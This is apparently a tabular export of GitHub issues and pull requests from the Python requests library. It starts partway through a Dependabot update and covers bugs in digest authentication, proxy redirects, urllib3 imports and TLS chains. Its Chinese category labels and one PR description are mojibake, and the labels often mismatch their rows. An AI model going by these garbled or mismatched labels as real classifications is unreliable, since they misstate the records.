<li>Https monitoring for all domains (included with the enterprise tier)</li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/step-security/harden-runner/compare/v2...v2.13.0"">https://github.com/step-security/harden-runner/compare/v2...v2.13.0</a></p>
<h2>v2.12.2</h2>
<h2>What's Changed</h2>
<p>Added HTTPS Monitoring for additional destinations - *.githubusercontent.com
Bug fixes:</p>
<ul>
<li>Implicitly allow local multicast, local unicast and broadcast IP addresses in block mode</li>
<li>Increased policy map size for block mode</li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/step-security/harden-runner/compare/v2...v2.12.2"">https://github.com/step-security/harden-runner/compare/v2...v2.12.2</a></p>
<h2>v2.12.1</h2>
<h2>What's Changed</h2>
<ul>
<li>Detection capabilities have been upgraded to better recognize attempts at runner tampering. These improvements are informed by real-world incident learnings, including analysis of anomalous behaviors observed in the tj-actions and reviewdog supply chain attack.</li>
<li>Resolved an issue where the block policy was not enforced correctly when the GitHub Actions job was running inside a container on a self-hosted VM runner.</li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/step-security/harden-runner/compare/v2...v2.12.1"">https://github.com/step-security/harden-runner/compare/v2...v2.12.1</a></p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/step-security/harden-runner/commit/ec9f2d5744a09debf3a187a3f4f675c53b671911""><code>ec9f2d5</code></a> Merge pull request <a href=""https://redirect.github.com/step-security/harden-runner/issues/565"">#565</a> from step-security/rc-24</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/04bcbc31cfcefe0cf4720832008735021cec5ec4""><code>04bcbc3</code></a> update agent</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/7c7a56fcaa124ab72fff1cc3e81257f264fd7317""><code>7c7a56f</code></a> feat: get job summary from API</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/6c439dc8bdf85cadbbce9ed30d1c7b959517bc49""><code>6c439dc</code></a> Merge pull request <a href=""https://redirect.github.com/step-security/harden-runner/issues/562"">#562</a> from step-security/rc-22</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/bf5688696d0b2cf8221eadb38e4232386015763a""><code>bf56886</code></a> update agent</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/5436dac7b5fa76a1a179168f5f4de86c00e22c84""><code>5436dac</code></a> update agent</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/88d305a3530acfa6d1939000baaa571e520df9c8""><code>88d305a</code></a> update agent</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/b976878278dbe3bc16039f7165b8faf809c50297""><code>b976878</code></a> update agent</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/875cc92db280a03598e7492a3e6c165c689f7af6""><code>875cc92</code></a> Update agent</li>
<li><a href=""https://github.com/step-security/harden-runner/commit/002fdce3c6a235733a90a27c80493a3241e56863""><code>002fdce</code></a> Merge pull request <a href=""https://redirect.github.com/step-security/harden-runner/issues/544"">#544</a> from step-security/rc-21</li>
<li>Additional commits viewable in <a href=""https://github.com/step-security/harden-runner/compare/0634a2670c59f64b4a01f0f96f84700a4088b9f0...ec9f2d5744a09debf3a187a3f4f675c53b671911"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=step-security/harden-runner&package-manager=github_actions&previous-version=2.12.0&new-version=2.13.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot show <dependency name> ignore conditions` will show all of the ignore conditions of the specified dependency
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)


</details>","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6999
3253318259,Test2,,å…¶ä»–,ä¸­,https://github.com/psf/requests/pull/6998
3252697709,Test,,å…¶ä»–,ä¸­,https://github.com/psf/requests/pull/6997
3243694956,Remove the unused tox and flake8 sections from Makefile,,å…¶ä»–,ä¸­,https://github.com/psf/requests/pull/6996
3243607325,Install tox and flake8 dependency to run make test and make flake8,I see that setting up this project as per the Makefile needs `tox` to run `make test` and `flake8` to run `make flake8`. I do not see these mentioned anywhere in the project installation steps that people need to install the pip package first before running the commands. This MR adds the `tox` and `flake8` dependency to dev requirements. ,å…¶ä»–,ä¸­,https://github.com/psf/requests/pull/6995
3241489178,docs: clarify timeout parameter uses seconds in Session.request,"- Updated Session.request() docstring to match requests.request()
- Changed 'How long to wait' to 'How many seconds to wait'
- Fixes inconsistency in timeout documentation

Fixes #6813","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6994
3241108091,Add support for Python 3.14 and drop support for Python 3.8,"This PR will start testing Python 3.14 to make sure we're ready for the October release. Assuming tests run, I'll add trove classifiers and change log notes. We'll also drop Python 3.8 support as we're now almost a year past its [official end of support](https://devguide.python.org/versions/).",å…¶ä»–,é«˜,https://github.com/psf/requests/pull/6993
3239837825,POST Multipart-Encoding does not work if the Content-Type header has been previously defined in the session,"Hi,

I just [wasted two hours](https://notes.sklein.xyz/2025-07-17_1544/) because it seems that the [POST Multiple Multipart-Encoded Files](https://requests.readthedocs.io/en/latest/user/advanced/#post-multiple-multipart-encoded-files) function does not work if a `Content-Type` has been previously defined at the session level.

Example:

```

...

session.headers.update({â€œContent-Typeâ€: â€œapplication/jsonâ€})

...

response = session.post(
    â€œhttp://localhost:3000/api/v1/pipelines/uploadâ€,
    files={
        â€œfileâ€: (â€œhello_world3.pyâ€, f, â€œtext/x-pythonâ€)
    },
    data={
        â€œurlIdxâ€: â€œ2â€
    }
)
```

Two suggestions:

- `a.` Either modify the implementation of [POST Multiple Multipart-Encoded Files](https://requests.readthedocs.io/en/latest/user/advanced/#post-multiple-multipart-encoded-files) to overwrite the content of the `Content-Type` header even if it has been defined at the session level
- `b.` Or issue a warning message to inform the developer of their possible error

What do you think?

Best regards,
StÃ©phane","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6992
3226571235,Fix: Correct Digest Auth URI handling for semicolons in path (#6990),"ä¿®å¤ç›®æ ‡ï¼šFixes #6990ï¼‰

é—®é¢˜åŸå› ï¼šï¼ˆURL è¢«é”™è¯¯è§£æå¯¼è‡´ Authorization ä¸­ URI å­—æ®µä¸å®Œæ•´ï¼‰

ä¿®å¤æ–¹å¼ï¼šå½“è¯·æ±‚ URL çš„ path ä¸­åŒ…å«åˆ†å·ï¼ˆ;ï¼‰æ—¶ï¼Œrequests åœ¨è¿›è¡Œ HTTP Digest è®¤è¯æ—¶ï¼ŒAuthorization å¤´ä¸­çš„ uri å­—æ®µä¼šä¸¢å¤±åˆ†å·åŠå…¶åé¢çš„å†…å®¹ï¼Œå¯¼è‡´è®¤è¯å¤±è´¥æˆ–è¡Œä¸ºå¼‚å¸¸ã€‚ä¾‹å¦‚ï¼Œè®¿é—®å¦‚ä¸‹ URL æ—¶ï¼šåŸæœ‰å®ç°åªä¿ç•™äº†åˆ†å·å‰çš„éƒ¨åˆ†ï¼Œuri å­—æ®µå˜æˆäº† /path1;param1/part2?foo=barï¼Œä¸¢å¤±äº† ;param2ã€‚ä¿®å¤æ–¹æ¡ˆä¿®æ”¹ src/requests/auth.py ä¸­ HTTPDigestAuth.build_digest_header æ–¹æ³•ï¼Œæ‹¼æ¥ path å’Œ params å­—æ®µï¼Œç¡®ä¿ uri å­—æ®µå®Œæ•´ä¿ç•™åˆ†å·åŠå…¶åçš„å†…å®¹ï¼Œç¬¦åˆ RFC 7616 è¦æ±‚ã€‚

å½±å“èŒƒå›´ï¼šåªå½±å“ Digest è®¤è¯åœºæ™¯ï¼Œä¸”ä»…åœ¨ URL è·¯å¾„ä¸­åŒ…å«åˆ†å·å‚æ•°æ—¶æœ‰å½±å“ã€‚å…¼å®¹æ€§è‰¯å¥½ï¼Œä¸å½±å“å…¶ä»–è®¤è¯æ–¹å¼å’Œæ™®é€šè¯·æ±‚ã€‚
æµ‹è¯•ç”¨ä¾‹ã€‚æ–°å¢æµ‹è¯•ç”¨ä¾‹ï¼ˆtests/test1.pyï¼‰ï¼ŒéªŒè¯ uri å­—æ®µåœ¨åŒ…å«åˆ†å·å‚æ•°æ—¶èƒ½æ­£ç¡®ç”Ÿæˆã€‚

","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6991
3225565650,`uri` field of digest authentication incorrectly filled when the URL contains semicolons in path,"<!-- Summary. -->
When there is a semicolon (`;`) in the request URL path, and when doing HTTP Digest Authentication, `requests` incorrectly fills the `uri` field of the `Authorization` header by ignoring the rest of the path.

As per [RFC 7616](https://www.rfc-editor.org/rfc/rfc7616#page-9), the `uri` field contains the ""Effective Request URI"", which should contain the same path we are trying to access.

## Expected Result

<!-- What you expected. -->
The `uri` field should contain the same path as the request when it contains semicolons.

## Actual Result

<!-- What happened instead. -->
The `uri` field removes everything from the first semicolon it finds in the path, up to the parameters.

## Reproduction Steps

The following example is where I found this problem: this tries to add 2 releases to a MusicBrainz collection.
The API uses a semicolon as a separator for adding multiple releases at once.

The following *will* return a 401 since the collection is private, but since the problem is in the `uri` field, it is not a problem to reproduce the bug.

```python
import requests
from requests.auth import HTTPDigestAuth

res = requests.put(""https://musicbrainz.org/ws/2/collection/53f4a001-eb45-4b72-9ec5-41109e88710d/releases/7dc2cfbd-5bd8-4ebc-b20b-4344985431da;38347564-5ef3-46dd-ad87-fe6d6f1e7b19?fmt=json&client=manual-python-requests-test"", auth=HTTPDigestAuth(""username"", ""password""))

res.request.headers['Authorization']
>>> [...] uri=""/ws/2/collection/53f4a001-eb45-4b72-9ec5-41109e88710d/releases/7dc2cfbd-5bd8-4ebc-b20b-4344985431da?fmt=json&client=manual-python-requests-test"" [...]
```

Only the first release has been kept! The query parameters are however untouched, so this is not a simple ""I see semicolon, I ignore everything after"".

Also, doing the same request with `curl` works as expected, as it correctly fills the `uri` field:
```bash
curl -X PUT ""https://musicbrainz.org/ws/2/collection/53f4a001-eb45-4b72-9ec5-41109e88710d/releases/7dc2cfbd-5bd8-4ebc-b20b-4344985431da;38347564-5ef3-46dd-ad87-fe6d6f1e7b19?fmt=json&client=manual-curl-test"" --digest -u ""username:password"" -v

# [...] A lot of lines
> [...] uri=""/ws/2/collection/53f4a001-eb45-4b72-9ec5-41109e88710d/releases/7dc2cfbd-5bd8-4ebc-b20b-4344985431da;38347564-5ef3-46dd-ad87-fe6d6f1e7b19?fmt=json&client=manual-curl-test"" [...]
```

Also, the request works with `requests` if I manually escape the semicolons as `%3B`, but one shouldn't have to.

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.2""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.13.5""
  },
  ""platform"": {
    ""release"": ""6.15.6"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.4""
  },
  ""system_ssl"": {
    ""version"": ""30200040""
  },
  ""urllib3"": {
    ""version"": ""2.5.0""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6990
3218254705,Reduce overhead of `Response.ok`,"Every time `ok` is used it feels like it should be essentially free, but it's not as it goes through `raise_for_status` which does a bunch of preparatory work to manage the reason and check for the two main error categories separately.

Reduce `ok` to just check for what it says it does in the first line.

Also makes the behaviour consistent with the docstring: before this change `ok` would return `True` if the status code is 600 or above (which some API providers are known to do e.g. Shopify can return 783[^1], LinkedIn has been known to return 999[^2]. However for that reason it is, technically, a breaking change.

[^1]: https://shopify.dev/docs/api/usage/response-codes
[^2]: https://stackoverflow.com/questions/27231113/999-error-code-on-head-request-to-linkedin","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",é«˜,https://github.com/psf/requests/pull/6989
3216515581,ImportError: cannot import name 'to_bytes' from 'urllib3.util.util' with requests==2.32.4 and urllib3==2.5.0,"Summary: ImportError: cannot import name 'to_bytes' from 'urllib3.util.util' with requests==2.32.4 and urllib3==2.5.0

**Expected Result**

The requests library (version 2.32.4) should function correctly with urllib3 version 2.5.0, without encountering ImportError for to_bytes. Our CI pipeline should successfully install all dependencies and build the Docker image.

**Actual Result**

Our CI pipeline fails during the pdm install step with the following traceback:

#16 11.64   âœ– Install PACKAGE 0.8.1 failed
#16 11.66 pdm.termui: Error occurs adding PACKAGE: 
#16 11.66 Traceback (most recent call last):
#16 11.66   File ""/usr/local/lib/python3.11/concurrent/futures/thread.py"", line 58, in run
#16 11.66     result = self.fn(*self.args, **self.kwargs)
#16 11.66              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#16 11.66   File ""/srv/.venv/lib/python3.11/site-packages/pdm/installers/synchronizers.py"", line 228, in install_candidate
#16 11.66     self.manager.install(can)
#16 11.66   File ""/srv/.venv/lib/python3.11/site-packages/pdm/installers/manager.py"", line 33, in install
#16 11.66     prepared.build(),
#16 11.66     ^^^^^^^^^^^^^^^^
#16 11.66   File ""/srv/.venv/lib/python3.11/site-packages/pdm/models/candidates.py"", line 397, in build
#16 11.66     self._obtain(allow_all=False)
#16 11.66   File ""/srv/.venv/lib/python3.11/site-packages/pdm/models/candidates.py"", line 451, in _obtain
#16 11.66     self._unpack(validate_hashes=not allow_all)
#16 11.66   File ""/srv/.venv/lib/python3.11/site-packages/pdm/models/candidates.py"", line 458, in _unpack
#16 11.66     with self.environment.get_finder() as finder:
#16 11.66   File ""/usr/local/lib/python3.11/contextlib.py"", line 137, in __enter__
#16 11.66     return next(self.gen)
#16 11.66            ^^^^^^^^^^^^^^
#16 11.66   File ""/srv/.venv/lib/python3.11/site-packages/pdm/environments/base.py"", line 145, in get_finder
#16 11.66     finder = PDMPackageFinder(
#16 11.66              ^^^^^^^^^^^^^^^^^
#16 11.66   File ""/srv/.venv/lib/python3.11/site-packages/pdm/models/finder.py"", line 71, in __init__
#16 11.66     super().__init__(session, **kwargs)
#16 11.66   File ""/srv/.venv/lib/python3.11/site-packages/unearth/finder.py"", line 129, in __init__
#16 11.66     _check_legacy_session(session)
#16 11.66   File ""/srv/.venv/lib/python3.11/site-packages/unearth/finder.py"", line 52, in _check_legacy_session
#16 11.66     from requests import Session
#16 11.66   File ""/srv/.venv/lib/python3.11/site-packages/requests/__init__.py"", line 43, in <module>
#16 11.66     import urllib3
#16 11.66   File ""/srv/.venv/lib/python3.11/site-packages/urllib3/__init__.py"", line 15, in <module>
#16 11.66     from ._base_connection import _TYPE_BODY
#16 11.66   File ""/srv/.venv/lib/python3.11/site-packages/urllib3/_base_connection.py"", line 5, in <module>
#16 11.66     from .util.connection import _TYPE_SOCKET_OPTIONS
#16 11.66   File ""/srv/.venv/lib/python3.11/site-packages/urllib3/util/__init__.py"", line 5, in <module>
#16 11.66     from .request import SKIP_HEADER, SKIPPABLE_HEADERS, make_headers
#16 11.66   File ""/srv/.venv/lib/python3.11/site-packages/urllib3/util/request.py"", line 9, in <module>
#16 11.66     from .util import to_bytes
#16 11.66 ImportError: cannot import name 'to_bytes' from 'urllib3.util.util' (/srv/.venv/lib/python3.11/site-packages/urllib3/util/util.py)
#16 11.66   âœ” Install urllib3 2.5.0 successful
#16 11.68   âœ– Install PACKAGE 0.4.1 failed
#16 11.68 pdm.termui: Error occurs adding PACKAGE: 
#16 11.68 Traceback (most recent call last):
#16 11.68   File ""/usr/local/lib/python3.11/concurrent/futures/thread.py"", line 58, in run
#16 11.68     result = self.fn(*self.args, **self.kwargs)
#16 11.68              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#16 11.68   File ""/srv/.venv/lib/python3.11/site-packages/pdm/installers/synchronizers.py"", line 228, in install_candidate
#16 11.68     self.manager.install(can)
#16 11.68   File ""/srv/.venv/lib/python3.11/site-packages/pdm/installers/manager.py"", line 33, in install
#16 11.68     prepared.build(),
#16 11.68     ^^^^^^^^^^^^^^^^
#16 11.68   File ""/srv/.venv/lib/python3.11/site-packages/pdm/models/candidates.py"", line 397, in build
#16 11.68     self._obtain(allow_all=False)
#16 11.68   File ""/srv/.venv/lib/python3.11/site-packages/pdm/models/candidates.py"", line 429, in _obtain
#16 11.68     with self.environment.get_finder(sources, env_spec=env_spec) as finder:
#16 11.68   File ""/usr/local/lib/python3.11/contextlib.py"", line 137, in __enter__
#16 11.68     return next(self.gen)
#16 11.68            ^^^^^^^^^^^^^^
#16 11.68   File ""/srv/.venv/lib/python3.11/site-packages/pdm/environments/base.py"", line 145, in get_finder
#16 11.68     finder = PDMPackageFinder(
#16 11.68              ^^^^^^^^^^^^^^^^^
#16 11.68   File ""/srv/.venv/lib/python3.11/site-packages/pdm/models/finder.py"", line 71, in __init__
#16 11.68     super().__init__(session, **kwargs)
#16 11.68   File ""/srv/.venv/lib/python3.11/site-packages/unearth/finder.py"", line 129, in __init__
#16 11.68     _check_legacy_session(session)
#16 11.68   File ""/srv/.venv/lib/python3.11/site-packages/unearth/finder.py"", line 52, in _check_legacy_session
#16 11.68     from requests import Session
#16 11.68   File ""/srv/.venv/lib/python3.11/site-packages/requests/__init__.py"", line 43, in <module>
#16 11.68     import urllib3
#16 11.68   File ""/srv/.venv/lib/python3.11/site-packages/urllib3/__init__.py"", line 15, in <module>
#16 11.68     from ._base_connection import _TYPE_BODY
#16 11.68   File ""/srv/.venv/lib/python3.11/site-packages/urllib3/_base_connection.py"", line 7, in <module>
#16 11.68     from .util.url import Url
#16 11.68   File ""/srv/.venv/lib/python3.11/site-packages/urllib3/util/__init__.py"", line 5, in <module>
#16 11.68     from .request import SKIP_HEADER, SKIPPABLE_HEADERS, make_headers
#16 11.68   File ""/srv/.venv/lib/python3.11/site-packages/urllib3/util/request.py"", line 9, in <module>
#16 11.68     from .util import to_bytes
#16 11.68 ImportError: cannot import name 'to_bytes' from 'urllib3.util.util' (/srv/.venv/lib/python3.11/site-packages/urllib3/util/util.py)
#16 11.69   âœ– Install websockets 15.0.1 failed
# ... (subsequent errors for other packages) ...


This error occurs specifically when urllib3 is resolved to version 2.5.0. When urllib3 is resolved to 2.4.0 (with the same requests version), the build passes.

**Reproduction Steps**

This issue is observed in a PDM-managed Python project within a Docker build environment.

Project Setup:
PACKAGE/pyproject.toml contains:
[project]
name = ""PACKAGE""
version = ""0.4.1""
dependencies = [
    ""requests>=2.31.0"",
    ""ray[default]==2.41"",
    ""PACKAGE"", # Placeholder for common package
    ""PACKAGE"", # Placeholder for core package
    # ... other dependencies
]
requires-python = ""==3.11.*""

The main application project (another PACKAGE) depends on this PACKAGE.
Dependency Resolution (PDM):
When pdm lock is run and resolves requests to 2.32.4 and urllib3 to 2.5.0 (as per the attached pdm.lock in the original issue description), the subsequent pdm install fails.
When pdm lock resolves requests to 2.32.4 and urllib3 to 2.4.0 (as per the attached pdm.lock from 3 weeks ago), the pdm install succeeds.
Minimal Python Code (Illustrative, as the error occurs during package loading): While the error occurs during package installation/loading, the underlying incompatibility is demonstrated by the import failure. A direct requests import might not immediately trigger it, but it's where the urllib3 dependency is consumed.
import requests
The error occurs during the internal loading of requests' dependencies,
specifically when it tries to import 'to_bytes' from urllib3.util.util.
This suggests an incompatibility between requests 2.32.4 and urllib3 2.5.0
regarding the location or existence of 'to_bytes'.

System Information
{
""chardet"": {
  ""version"": null
},
""charset_normalizer"": {
  ""version"": ""3.4.2""
},
""cryptography"": {
  ""version"": """"
},
""idna"": {
  ""version"": ""3.10""
},
""implementation"": {
  ""name"": ""CPython"",
  ""version"": ""3.11.11""
},
""platform"": {
  ""release"": ""24.5.0"",
  ""system"": ""Darwin""
},
""pyOpenSSL"": {
  ""openssl_version"": """",
  ""version"": null
},
""requests"": {
  ""version"": ""2.32.4""
},
""system_ssl"": {
  ""version"": ""30500000""
},
""urllib3"": {
  ""version"": ""2.5.0""
},
""using_charset_normalizer"": true,
""using_pyopenssl"": false
}
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",é«˜,https://github.com/psf/requests/issues/6988
3215802613,Add specifications to the main,I added specifications to the requirements of requests using doorstop,åŠŸèƒ½å»ºè®®,ä¸­,https://github.com/psf/requests/pull/6987
3212647110,Print post,"Par rapport Ã  la branche principale, on a rajoutÃ© des spÃ©cifications ainsi qu'un affichage via print des donnÃ©es poussÃ©es sur le serveur via POST.",å…¶ä»–,ä¸­,https://github.com/psf/requests/pull/6986
3210212126,fix: `http_proxy` bug with `starlette.responses.RedirectResponse` (Closes #6981),"## Description
This PR fixes issue #6981

## Changes
- 1 file(s) modified

## Analysis
**Problem Description**

The issue arises when using the `requests` library with the `http_proxy` environment variable set and explicitly passing `proxies={'http': None, 'https': None}` to bypass the proxy. Although the original request respects this setting, any redirected requests (e.g., 3xx status codes) incorrectly pick up the proxy settings from the environment, leading to connection errors if the target is not proxy-accessible.

**Expected Behavior**

When passing `proxies={'http': None, 'https': None}` to a request, both the original and any redirected requests should bypass the proxy and not use the `http_proxy` environment variable. The proxy settings should be ignored for all requests, including redirects.

**What Needs to Be Fixed**

The issue is caused by the way `requests` handles proxies in its sessions module (specifically, [sessions.py line 316](https://github.com/psf/requests/blob/main/src/requests/sessions.py#L316)). The fix suggested is to update this line to:

`new_...","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/pull/6985
3210195989,fix: `http_proxy` bug with `starlette.responses.RedirectResponse` (Closes #6981),"## Description
This PR fixes issue #6981

## Changes
- 1 file(s) modified

## Analysis
**Problem Summary**

The issue arises when using the `requests` library with an environment variable set for `http_proxy`. When making a request that returns a redirect (e.g., 3xx), the redirected request incorrectly picks up the proxy settings from the environment, causing the request to fail. Specifically, only the original request respects the explicitly passed-in `proxies={'http': None, 'https': None}` setting; the redirected request ignores it and uses the proxy from the environment variable.

**Expected Behavior**

When passing `proxies={'http': None, 'https': None}` to a request, both the original request and any redirected requests should bypass the proxy and not use the `http_proxy` environment variable.

**Reproduction Steps**

The issue can be reproduced with the following Python code:
```python
import os
import requests

os.environ['http_proxy'] = 'http://some.invalid.proxy:8080'
url = ""http://httpbin.org/redirect-to?url=http://example.com""
resp = requests.get(url, proxies=...","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6984
3210126747,fix: `http_proxy` bug with `starlette.responses.RedirectResponse` (Closes #6981),"## Description
This PR fixes issue #6981

## Changes
- 1 file(s) modified

## Analysis
**Problem Description:**

When making an HTTP request with the `requests` library and explicitly disabling proxy settings by passing `proxies={'http': None, 'https': None}`, the first request correctly bypasses the proxy. However, if the response is a redirect (e.g., 3xx), the redirected request incorrectly uses the proxy settings from the environment (`http_proxy`) instead of respecting the explicit `proxies` setting.

**Expected Behavior:**

When passing `proxies={'http': None, 'https': None}`, both the original and any redirected requests should bypass the proxy and not use the `http_proxy` environment variable.

**What Happened Instead:**

Only the original request respects the `proxies={'http': None, 'https': None}` setting. The redirected request ignores it and uses the proxy from the environment variable (`http_proxy`), leading to connection errors if the target is not proxy-accessible.

**Reproduction Steps:**

The issue can be reproduced by setting the `http_proxy` environment...","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/pull/6983
3210087664,fix: `http_proxy` bug with `starlette.responses.RedirectResponse` (Closes #6981),"## Description
This PR fixes issue #6981

## Changes
- 1 file(s) modified

## Analysis
**Problem Description:**

When using the `requests` library with the `http_proxy` environment variable set, and explicitly passing `proxies={'http': None, 'https': None}` to bypass the proxy, only the original request respects this setting. However, if a redirect (e.g., 3xx) is encountered during the request, the redirected request incorrectly picks up the proxy settings from the environment, causing the request to fail.

**Expected Behavior:**

When passing `proxies={'http': None, 'https': None}` to a request, both the original and any redirected requests should bypass the proxy and not use the `http_proxy` environment variable.

**Root Cause:**

The issue arises because the `requests` library's handling of proxies is not correctly propagated during redirects. When the `proxies={'http': None, 'https': None}` setting is explicitly passed in, it should override any environment variables that might be set for proxying.

**Fix Suggestion:**

To fix this issue, the `resolve_proxies` functi...","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/pull/6982
3190536338,`http_proxy` bug with `starlette.responses.RedirectResponse`,"<!-- Summary. -->

When using requests with the http_proxy environment variable set, and explicitly passing `proxies={'http': None, 'https': None}` to bypass the proxy, the first request correctly avoids using the proxy. However, if the request returns a redirect (e.g. 3xx), the redirected request incorrectly picks up the proxy settings from the environment, causing the request to fail.

<!-- What you expected. -->

When passing `proxies={'http': None, 'https': None}` to a request, both the original and any redirected requests should bypass the `proxy` and not use the `http_proxy` environment variable.

<!-- What happened instead. -->

Only the original request respects the `proxies={'http': None, 'https': None}` setting. The redirected request ignores it and uses the proxy from the environment variable, leading to connection errors if the target is not proxy-accessible.

## Reproduction Steps

```python
import os
import requests

# Set environment variable proxy (simulating a typical corporate environment)
os.environ['http_proxy'] = 'http://some.invalid.proxy:8080'

# Target URL that redirects to another domain
url = ""http://httpbin.org/redirect-to?url=http://example.com""

# Explicitly disable proxy
resp = requests.get(url, proxies={'http': None, 'https': None})
print(resp.status_code)
```

# Suggested Fix
In [sessions.py line 316](https://github.com/psf/requests/blob/main/src/requests/sessions.py#L316):

`new_proxies = resolve_proxies(prepared_request, proxies, self.trust_env)`
should be updated to:
`new_proxies = resolve_proxies(prepared_request, proxies, self.trust_env if proxies is None else False)`

This ensures that when proxies is explicitly passed in by the user (even as None), environment proxies are not used for redirects.

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6981
3188703198,m3u8 video error,"Please refer to our [Stack Overflow tag](https://stackoverflow.com/questions/tagged/python-requests) for guidance.


It doesn't work. It downloads an m3u8 video that freezes segments in some parts of the video.","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/issues/6980
3186137191,thread safe connection pool,"Hi, 

I got feedback from several forums that requests thread pool is not thread safe, and I was suggested to create a session (with a dedicated connection pool) per thread, I feel that with this approach I will lose most of the benefits of the connections pool.

is it really the case, can you please elaborate with the recommended approach?

Thanks,
Eilon ","åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/issues/6979
3183455273,requests fails to connect even if trusted leaf certificate is provided when server's cert chain is incomplete,"Say you have a server that provides a cert chain

A -> B -> D

but D is actually signed by C, which is not provided by the chain.

(Unfortunately I have no control over this particular mistake so I can't get it fixed, and I don't even have a way to obtain C.)

Now obviously I can't just trust A and get things to work, but my problem is that even if I specify that I trust D `verify=""/path/to/d.pem`, `requests` will still fail to connect.
This is in contrast with what `curl` does (`--cacert /path/to/d.pem`), where if the leaf is trusted it doesn't care that it can't find its issuer: it's specified as a root anyway.

## Expected Result

*Connects*

## Actual Result

```
requests.exceptions.SSLError: HTTPSConnectionPool(host='192.168.1.1', port=443): Max retries exceeded with url: /ws (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1006)')))
```

## Reproduction Steps

Spawn an HTTPS server with an incomplete cert chain (e.g. no intermediate certificate).
Make a request to it using requests.

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.0""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.11.10""
  },
